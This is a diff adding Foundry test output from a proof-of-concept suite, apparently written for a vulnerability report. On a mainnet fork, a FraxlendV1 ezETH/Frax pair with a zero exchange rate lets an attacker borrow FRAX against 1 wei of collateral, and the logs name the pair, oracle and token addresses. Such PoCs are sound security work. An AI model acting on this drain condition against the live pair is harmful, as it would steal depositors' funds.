@@ -1,0 +1,37 @@
+Using block 25233205
+No files changed, compilation skipped
+
+Ran 2 tests for src/test/V1EzEthZeroExchangeRateDrainPoC.t.sol:V1EzEthZeroExchangeRateDrainPoC
+[PASS] test_POC_AnyNewLiquidityCanBeBorrowedWithDustCollateral() (gas: 553556)
+Logs:
+  availableAfterNewDeposit: 11000000000000000000
+  newLiquidityDeposited: 10000000000000000000
+  attackerFraxGainedFromNewLiquidity: 10000000000000000000
+  attackerEzEthCollateral: 1
+  attackerBorrowShares: 992024296839487756
+
+[PASS] test_POC_EzEthPairZeroExchangeRateAllowsDustCollateralBorrow() (gas: 417312)
+Logs:
+  asset: 0x853d955aCEf822Db058eb8505911ED77F175b99e
+  collateral: 0xaf620E6913Fc52AcF7C5a5e08Bd4Cb8aa64Be211
+  FraxlendV1 - ezETH/Frax - Variable Time-Weighted Interest Rate - 8
+  oracleDivide: 0x27942aFe4EcB7F9945168094e0749CAC749aC97B
+  sfrxETH / USD
+  oracleDecimals: 18
+  oracleAnswer: 2151822291531842456823
+  oracleUpdatedAt: 1780445459
+  oracleNormalization: 100000000000000000000
+  storedLastTimestampBefore: 1718356787
+  storedExchangeRateBefore: 0
+  returnedExchangeRate: 0
+  storedExchangeRateAfter: 0
+  availableAsset: 1000000000000000000
+  borrowAmountAttempted: 1000000000000000000
+  attackerFraxGained: 1000000000000000000
+  attackerEzEthSpent: 1
+  attackerBorrowShares: 99202429683948776
+  attackerPairCollateral: 1
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.18s (3.65s CPU time)
+
+Ran 1 test suite in 4.45s (4.18s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
